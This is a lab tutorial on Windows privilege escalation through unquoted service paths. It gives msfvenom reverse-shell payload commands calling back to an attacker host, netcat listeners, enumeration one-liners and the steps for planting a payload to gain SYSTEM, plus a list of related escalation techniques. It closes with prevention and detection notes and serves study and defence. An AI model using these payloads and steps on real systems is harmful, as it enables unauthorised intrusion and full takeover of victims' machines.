# Windows Privilege Escalation: Unquoted Service Path

> **Goal:** Escalate from a low-privileged user (or a reverse shell running as a standard user) to `NT AUTHORITY\SYSTEM` by abusing a Windows service that has an **unquoted executable path** and a **writable directory** somewhere along that path.

---

## 1. The Theory — What Is an Unquoted Service Path?

Every Windows service has a registry entry describing the executable that should run when the service starts. That path is stored as a string, e.g.:

```
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```

If this string is **not wrapped in double quotes**, the Windows Service Control Manager (SCM) doesn't know where the folder names end and the executable name begins — because **spaces are ambiguous** (they could be part of a folder name, or a separator).

So Windows falls back to a documented, deterministic resolution algorithm: it tries executing progressively longer segments of the path, **splitting at every space**, until it finds a match.

### Resolution order example

Given the unquoted path:
```
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```

Windows attempts, **in this exact order**:

| # | Attempted Path |
|---|---|
| 1 | `C:\Program.exe` |
| 2 | `C:\Program Files\Unquoted.exe` |
| 3 | `C:\Program Files\Unquoted Path.exe` |
| 4 | `C:\Program Files\Unquoted Path Service\Common.exe` ✅ *(this is where our lab payload lands)* |
| 5 | `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe` *(the real, intended target)* |

**The key insight:** if an attacker can drop a malicious executable at *any earlier stop* in that chain (e.g., `Common.exe` inside `Unquoted Path Service\`), and no file already exists there to be executed first, Windows will happily launch the attacker's binary **before it ever reaches the legitimate one**.

> 🧠 **Mental model:** "No quotes = Windows guesses. Give it something to guess wrong with, sitting earlier in the guess order, and you win."

### Why This Is Dangerous

- Windows services frequently run as **`LocalSystem`** — the single highest-privilege local account on the box (higher than local Administrator for most purposes).
- If the folder along the vulnerable path chain is **writable by a low-privileged user** (misconfigured NTFS permissions — a shockingly common finding in the real world, especially with legacy or third-party software installers), the attacker can drop a payload there.
- When the service (re)starts — on boot, on a crash/restart, or on-demand via `net start` — **the payload executes with the service's privileges**, i.e., SYSTEM.

This is a classic example of a **local privilege escalation (LPE)** vulnerability class: *"low-priv write access + high-priv execution trigger = privilege boundary broken."* You'll see this exact pattern again and again across different techniques (DLL hijacking, scheduled tasks, services, etc.) — the specific mechanism changes, the *logic* doesn't.

---

## 2. Lab Setup

| Component | Role |
|---|---|
| Kali Linux | Attacker machine |
| Windows 10/Server (victim) | Has a deliberately misconfigured service: `unquotedsvc` |
| `msfvenom` | Generates the malicious payload (reverse shell EXE) |
| `netcat` (`nc`) | Catches the reverse shell connection |
| `accesschk64.exe` (Sysinternals) | Enumerates effective NTFS permissions to confirm write access |
| Python's built-in HTTP server | Simple, no-dependency way to transfer files to the victim |

---

## 3. Full Attack Chain, Step by Step

### Step 1 — Generate the Initial Foothold Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe -o reverse.exe
```

- `-p windows/x64/shell_reverse_tcp` → a **staged, plain (non-Meterpreter) reverse shell** payload for 64-bit Windows. Using a plain shell (vs. Meterpreter) keeps things simple and is easier to catch with a basic `nc` listener.
- `LHOST` / `LPORT` → where the victim should connect *back* to (this is what makes it a **reverse** shell — it evades inbound-firewall restrictions because the victim initiates the outbound connection).
- `-f exe -o reverse.exe` → output format and filename.

> 💡 **Why reverse, not bind, shell?** Corporate firewalls typically block *inbound* connections to arbitrary ports on workstations but allow *outbound* traffic. A reverse shell flips the direction so the victim "calls home," which is far less likely to be blocked.

### Step 2 — Host the Payload for Delivery

```bash
python3 -m http.server 80
```

Starts a lightweight web server on Kali, serving the current directory (which contains `reverse.exe`). This avoids needing SMB, FTP, or other heavier file-transfer setups — on a real engagement, you'd only need `certutil.exe` or a browser on the Windows side to pull it down.

### Step 3 — Start the Listener

```bash
nc -lnvp 4444
```

- `-l` listen, `-n` no DNS resolution (speed), `-v` verbose, `-p 4444` port to bind.
- This must be running **before** the victim executes the payload, or the connection attempt will simply fail/be refused.

### Step 4 — Deliver & Execute on the Victim

On the Windows victim (simulating an already-compromised low-priv foothold, e.g. via phishing, a web app RCE, etc.), download and run `reverse.exe`. In the lab this was done via a browser hitting `http://<Kali_IP>/reverse.exe`, saved to `C:\Users\admin\Downloads`.

### Step 5 — Catch the Shell

```
listening on [any] 4444 ...
connect to [192.168.26.130] from (UNKNOWN) [192.168.26.134] 50252
Microsoft Windows [Version 10.0.19045.5965]

C:\Users\admin\Downloads>whoami
whoami
desktop-8q3bpvs\admin
```

We now have **code execution as a standard local user** (`admin`, but *not* elevated — this is just an account name, don't confuse it with Administrator privileges).

### Step 6 — Confirm We're NOT Yet SYSTEM

```
C:\Users\admin\Downloads>whoami /priv
```

```
PRIVILEGES INFORMATION
-----------------------
Privilege Name           Description                          State
========================= ===================================== =========
SeShutdownPrivilege       Shut down the system                 Disabled
SeChangeNotifyPrivilege   Bypass traverse checking              Enabled
SeUndockPrivilege         Remove computer from docking station  Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set    Disabled
SeTimeZonePrivilege       Change the time zone                  Disabled
```

> 🧠 **Why check `whoami /priv`?** It shows the **token privileges** attached to your current process — this is *the* first move of every real Windows PrivEsc engagement. A handful of these privileges (`SeImpersonatePrivilege`, `SeDebugPrivilege`, `SeBackupPrivilege`, `SeTakeOwnershipPrivilege`, etc.) are themselves instant-root-equivalent if enabled — see the "Related & Next Techniques" section below. Here, nothing juicy is enabled, so we pivot to service-based escalation instead.

### Step 7 — Enumerate Services for Unquoted Paths

```
wmic service get name,pathname | findstr /v /i "system32" | findstr /v \"
```

Breaking this command down (this is a favorite interview/exam question):

| Part | Purpose |
|---|---|
| `wmic service get name,pathname` | Lists every installed service's name + its executable path |
| `findstr /v /i "system32"` | `/v` = invert match (exclude), `/i` = case-insensitive. Filters out the huge number of built-in Windows services living in `System32` (rarely misconfigured, huge noise) |
| `findstr /v \"` | Inverts again — excludes any line that **contains a double-quote character**. Since properly-quoted paths contain `"`, this leaves us with only the **unquoted** candidates. |

This one-liner is a classic piece of Windows enumeration tradecraft: quick, no extra tools needed, and directly targets the vulnerability class.

Lab output revealed:
```
unquotedsvc   C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```
— an unquoted path with spaces. Immediate red flag.

> 🔧 **Automated alternative:** tools like `winPEAS`, `PowerUp.ps1` (`Get-ServiceUnquoted`), and Seatbelt automate this check across the whole system and cross-reference it with writable-directory checks in one pass. Manual commands are shown here because **understanding the manual method is what lets you adapt when tools are blocked by AV/EDR.**

### Step 8 — Confirm Write Access Along the Path (ACL Check)

Just finding an unquoted path isn't enough — you also need **write permission** to one of the intermediate folders. Enter `accesschk` (a legitimate Microsoft Sysinternals tool, which is *why* it's rarely flagged by AV):

```
accesschk64.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
```

| Flag | Meaning |
|---|---|
| `/accepteula` | Silently accept the Sysinternals EULA (needed for non-interactive/scripted use) |
| `-u` | Suppress errors, only show accessible objects |
| `-w` | Show only objects with **write** access |
| `-d` | Only check **directories**, not individual files |
| `-q` | Quiet mode — omit the banner |

**Result in the lab:**
```
C:\Program Files\Unquoted Path Service
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

🚩 **`RW BUILTIN\Users`** is the finding that matters. `BUILTIN\Users` is essentially "any authenticated local user" — including our low-privileged shell. This confirms we can write into that directory.

> ⚠️ **Note the subtlety:** the *parent* folder `Unquoted Path Service` was writable, but the *subfolder* `Common Files` (checked separately in the lab) was **not** listed with `BUILTIN\Users`. This matters — you must drop your payload at the **exact stop in the resolution chain** where you *do* have write access (Step 4 of the theory table: `Common.exe` inside `Unquoted Path Service\`, not deeper).

### Step 9 — Identify the Vulnerable Service in Detail

```
sc qc unquotedsvc
```

`sc qc` = **Service Control, Query Configuration**. Output:

```
SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        ...
        SERVICE_START_NAME : LocalSystem
```

Two critical confirmations here:
1. **`SERVICE_START_NAME : LocalSystem`** — this service runs as SYSTEM. This is the whole point; escalation only "pays off" if the service's run-as account is more privileged than us.
2. **`START_TYPE: DEMAND_START`** — the service doesn't start automatically; we (or an admin, or a reboot trigger) must start it. In the lab we have permission to start it manually via `net start`. On a real engagement, if you *can't* start the service yourself, you'd wait for a reboot, a scheduled restart, or a crash-recovery trigger instead — still exploitable, just less immediate.

### Step 10 — Build the SYSTEM-Level Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<Kali_IP> LPORT=1111 -f exe -o Common.exe
```

A **second, separate payload** on a **different port** (`1111` instead of `4444`). This is deliberate lab hygiene, not a requirement of the technique itself:
- Keeps the two shells (low-priv vs. SYSTEM) distinguishable in your listener history.
- Avoids port/state collisions with the first listener.

Critically, **the filename must be exactly `Common.exe`** — it must match precisely what Windows will look for at that stop in the unquoted-path resolution chain (see Step 1 theory table, entry #4).

### Step 11 — Place the Payload at the Exploit Path

```
copy Common.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

This literally plants our malicious executable exactly where the SCM will look for it *before* it ever reaches the legitimate, deeper `unquotedpathservice.exe`.

### Step 12 — Start a Second Listener

```bash
nc -lnvp 1111
```

### Step 13 — Trigger the Service

```
net start unquotedsvc
```

This is the moment of truth: the SCM parses the unquoted path, splits on spaces, and — following the documented Windows resolution order — **executes `Common.exe` first**, because it finds a match there before reaching the real target.

### Step 14 — Confirm SYSTEM Access

Back on the Kali listener:

```
whoami
nt authority\system
```

🎉 **Full privilege escalation achieved.** We went from a standard user shell to `NT AUTHORITY\SYSTEM` — the highest local privilege level on Windows — purely through a **misconfiguration**, no memory-corruption exploit or CVE required.

---

## 4. Full Attack Chain — Summary Table

| Step | Action | Purpose |
|---|---|---|
| 1 | `msfvenom` → `reverse.exe` | Build initial foothold payload |
| 2 | `python3 -m http.server 80` | Serve payload for download |
| 3 | Download `reverse.exe` on victim | Deliver payload |
| 4 | `nc -lnvp 4444` | Start listener |
| 5 | Execute `reverse.exe` on Windows | Get initial low-priv shell |
| 6 | `whoami` / `whoami /priv` | Confirm current context, check for other quick wins |
| 7 | `wmic service get name,pathname \| findstr ...` | Enumerate unquoted service paths |
| 8 | `accesschk64.exe -uwdq "<path>"` | Confirm writable directory |
| 9 | `sc qc <service>` | Confirm `LocalSystem` + get exact binary path |
| 10 | `msfvenom` → `Common.exe` | Build privileged payload, named to match the gap |
| 11 | `copy Common.exe "<vulnerable path>"` | Plant payload |
| 12 | `nc -lnvp 1111` | Start second listener |
| 13 | `net start <service>` | Trigger service, execute payload as SYSTEM |
| 14 | `whoami` on new shell | Confirm `nt authority\system` |

---

## 5. Related & Next Techniques (Expand Your Toolkit)

This lab covered *one* specific Windows service-abuse pattern. Once you understand it, these sibling techniques will click fast:

| Technique | Core Idea |
|---|---|
| **Weak service permissions (not path-related)** | Even with a *quoted* path, if the service's own permissions (not the folder's) grant `SERVICE_CHANGE_CONFIG` to low-priv users, you can just repoint `binPath` directly with `sc config <svc> binpath= "C:\payload.exe"` — no unquoted-path trick needed. Check with `accesschk64.exe -uwcq <svc>`. |
| **DLL Hijacking** | If a privileged process loads a DLL from a writable, non-System32 directory (or exploits Windows DLL search order), drop a malicious DLL with the expected name. |
| **AlwaysInstallElevated** | If two registry keys (`HKLM` and `HKCU\...\AlwaysInstallElevated`) are both set to `1`, any user can install an `.msi` **as SYSTEM** — instant root via `msfvenom -f msi`. |
| **Scheduled Tasks** | Same logic as services: if a SYSTEM-run scheduled task points to a writable script/binary, replace it. |
| **Token Impersonation (`SeImpersonatePrivilege`)** | If enabled in `whoami /priv`, tools like **PrintSpoofer**, **RoguePotato**, or **GodPotato** can escalate to SYSTEM almost instantly — check this *before* going down the service-enumeration path, since it's often faster. |
| **Unattended install files** (`unattend.xml`, `sysprep.inf`) | Sometimes contain plaintext local admin credentials left over from imaging. |

> 🧠 **Study tip:** Every Windows LPE technique boils down to the same three-part question: *"Is there a process/task/service that runs with higher privileges than me, and can I control (via file write, config write, or environment) something it will trust and execute?"* Learn to ask that question reflexively during enumeration.

---

## 6. Blue Team / Defensive Notes

As a mentor, I always want you to close the loop and think like a defender too — it makes you a better attacker and makes your reports actually valuable to clients.

### How to Prevent This

1. **Always quote service paths containing spaces**, e.g.:
   ```
   "C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe"
   ```
   This is the root fix — Windows will never do ambiguous resolution on a quoted path.
2. **Lock down NTFS permissions** on `C:\Program Files\*` subdirectories so `BUILTIN\Users` never has write access. This should be the default, but third-party installers frequently loosen it.
3. **Principle of least privilege for service accounts** — not every service needs to run as `LocalSystem`. Use a dedicated, minimally-privileged service account (`NT SERVICE\<name>` virtual accounts, or a custom low-priv domain/local account) wherever possible.
4. **Audit regularly**: run `wmic service get name,pathname | findstr /v /i "system32" | findstr /v \"` (or the automated equivalent in **PowerUp.ps1**, **Seatbelt**, or **PingCastle**) as part of routine hardening reviews, not just during pentests.

### How to Detect This (Blue Team / SOC)

- **Sysmon Event ID 1** (process creation) for unexpected binaries launching from paths like `Common.exe`, `Program.exe`, etc. — filenames that look like *truncated* legitimate paths are a strong signal.
- **Service start events (Event ID 7036 / 7040)** correlated with a process creation event where the launched binary's hash/signature doesn't match the expected vendor binary.
- **File integrity monitoring (FIM)** on `C:\Program Files\` directories to alert on unexpected file creation by non-admin/non-installer processes.
- **EDR behavioral rules**: "non-installer process writes an executable into `Program Files`" is a high-fidelity detection opportunity.

---

## 7. Command Quick Reference

```powershell
# Enumerate current privileges
whoami
whoami /priv

# Find unquoted service paths
wmic service get name,pathname | findstr /v /i "system32" | findstr /v \"

# Check write access on a directory (needs accesschk64.exe)
accesschk64.exe /accepteula -uwdq "C:\Path\To\Check"

# Query full service config
sc qc <ServiceName>

# Start / stop a service you have rights to control
net start <ServiceName>
net stop <ServiceName>

# Copy payload into place
copy payload.exe "C:\Vulnerable\Path\Common.exe"
```

```bash
# Attacker-side (Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o out.exe
python3 -m http.server 80
nc -lnvp <PORT>
```
